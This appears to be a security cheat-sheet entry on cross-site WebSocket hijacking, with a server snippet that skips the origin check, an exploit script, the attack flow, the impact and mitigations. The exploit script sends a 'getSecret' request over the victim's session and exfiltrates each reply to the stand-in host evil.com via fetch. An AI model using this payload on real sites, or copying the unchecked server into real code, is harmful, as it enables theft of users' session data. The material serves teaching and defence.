## WebSocket Hijacking

### Vulnerable Code Pattern
```javascript
const wss = new WebSocket.Server({ port: 8080 });

wss.on('connection', (ws, req) => {
    // No origin check!
    ws.on('message', (msg) => {
        // Process sensitive data
    });
});
```

### Exploit HTTP Request
```html
<script>
    const ws = new WebSocket('wss://vulnerable-app.com/ws');
    ws.onopen = () => ws.send('{"action": "getSecret"}');
    ws.onmessage = (e) => fetch('https://evil.com/steal?d=' + e.data);
</script>
```

### Attack Flow
1. Victim visits attackers page
2. WebSocket connects to victims session (cookies sent)
3. Attacker sends commands via WebSocket
4. Responses exfiltrated to attacker

### Impact
- Session hijacking via WebSocket
- Real-time data theft
- Command injection through WebSocket messages
- Cross-site WebSocket hijacking (CSWSH)

### Mitigation
- Validate Origin header on WebSocket upgrade
- Token-based authentication for WebSocket
- SameSite cookies
- CSRF tokens in WebSocket handshake

